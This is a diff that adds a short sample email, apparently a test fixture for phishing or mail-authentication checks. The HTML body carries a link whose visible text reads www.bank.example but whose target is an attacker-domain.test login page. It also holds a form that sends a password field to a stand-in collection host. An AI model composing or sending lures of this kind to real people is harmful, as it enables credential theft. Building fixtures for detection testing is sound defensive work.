@@ -1,0 +1,11 @@
+Received: from a.example (a.example [203.0.113.9]) by b.example; Tue, 3 Feb 2026 09:00:00 +0200
+Authentication-Results: b.example; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com
+From: Bank <alerts@example.com>
+To: user@recipient.example
+Subject: Verify
+Date: Tue, 3 Feb 2026 09:00:00 +0200
+Content-Type: text/html; charset=UTF-8
+
+<html><body><p>Please visit
+<a href="https://secure-login.attacker-domain.test/verify?url=https%3A%2F%2Fbank.example">www.bank.example</a></p>
+<form action="https://attacker-domain.test/collect"><input name="pw"></form></body></html>
